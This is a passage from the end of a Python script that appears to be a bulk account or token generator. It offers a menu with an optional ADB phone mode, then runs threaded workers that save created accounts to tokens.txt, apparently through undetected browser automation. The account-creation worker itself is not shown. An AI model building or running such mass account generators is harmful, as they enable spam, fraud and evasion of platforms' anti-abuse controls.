        mode_input = input(f'{Fore.LIGHTGREEN_EX}Choice (1/2): {Fore.RESET}').strip()

        if mode_input == '1':
            config['use_adb'] = False
            break
        elif mode_input == '2':
            adb_path = get_adb_path()
            if not os.path.exists(adb_path):
                log.error(f'ADB missing! Cannot find adb.exe at {adb_path}')
                log.info('Falling back to Normal mode...')
                config['use_adb'] = False
                break
            else:
                log.info('Checking for connected ADB devices...')
                try:
                    subprocess.run([adb_path, 'start-server'], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    result = subprocess.run([adb_path, 'devices'], capture_output=True, text=True, check=False)
                    devices = [line for line in result.stdout.splitlines() if line.strip() and not line.startswith('List') and not line.startswith('*')]
                    if not devices:
                        log.warning('No ADB devices detected! Please connect your phone and enable USB Debugging.')
                        retry = input(f'{Fore.LIGHTCYAN_EX}Retry detection? (y/n): {Fore.RESET}').strip().lower()
                        if retry == 'y':
                            continue
                        else:
                            log.info('Falling back to Normal mode...')
                            config['use_adb'] = False
                            break
                    else:
                        log.success(f'ADB Device detected: {devices[0].split()[0]}')
                        config['use_adb'] = True
                        break
                except Exception as e:
                    log.error(f'Error communicating with ADB: {e}')
                    config['use_adb'] = False
                    break
        else:
            log.warning('Please enter \'1\' or \'2\'')

    SESSION_CREATED = 0
    SESSION_STOP = False

    if SESSION_TARGET == 0:
        log.info('Mode: INFINITE  — press Ctrl+C to stop')
    else:
        log.info(f'Mode: FIXED     — will create {SESSION_TARGET} token(s) then stop')

    thread_count = int(config.get('Threads', 1))

    while True:
        if SESSION_STOP:
            break
        tasks = [asyncio.create_task(worker()) for _ in range(thread_count)]
        await asyncio.gather(*tasks)
        if SESSION_STOP:
            break

    print(f"\n{Fore.GREEN}{'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'}{Fore.RESET}")
    print(f'{Fore.GREEN}  Session complete — {SESSION_CREATED} account(s) saved to tokens.txt{Fore.RESET}')
    print(f"{Fore.GREEN}{'━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'}{Fore.RESET}\n")


if __name__ == '__main__':
    warnings.filterwarnings('ignore', category=ResourceWarning)
    try:
        uc.loop().run_until_complete(main())
    except KeyboardInterrupt:
        print(f'\n{Fore.YELLOW}[WARNING]{Fore.RESET} Stopped by user')
    except Exception as e:
        print(f'\n{Fore.RED}[ERROR]{Fore.RESET} {e}')